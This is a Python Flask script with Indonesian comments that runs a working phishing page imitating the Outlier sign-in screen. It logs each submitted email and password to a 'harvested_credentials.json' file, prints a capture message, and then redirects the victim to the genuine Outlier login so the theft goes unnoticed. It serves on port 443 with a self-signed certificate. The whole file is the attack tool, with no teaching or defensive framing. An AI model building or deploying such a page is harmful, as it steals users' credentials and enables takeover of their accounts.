from flask import Flask, request, render_template_string, redirect
import json
import datetime

app = Flask(__name__)

# Template HTML sederhana meniru halaman login Outlier
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Outlier Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 300px; }
        .login-card h2 { margin-top: 0; color: #333; text-align: center; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; color: #666; }
        .form-group input { width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }
        .btn { width: 100%; padding: 10px; background-color: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer; }
        .btn:hover { background-color: #0052a3; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>Outlier Sign In</h2>
        <form action="/login" method="POST">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Sign In</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Simpan kredensial ke file terstruktur (JSON)
    log_data = {
        "timestamp": str(datetime.datetime.now()),
        "email": email,
        "password": password
    }
    
    with open('harvested_credentials.json', 'a') as f:
        f.write(json.dumps(log_data) + '\n')
        
    print(f"[+] Successfully captured credentials for: {email}")
    return redirect('https://app.outlier.ai/login')

if __name__ == '__main__':
    # Menjalankan server lokal dengan sertifikat SSL/TLS mandiri (adhoc)
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')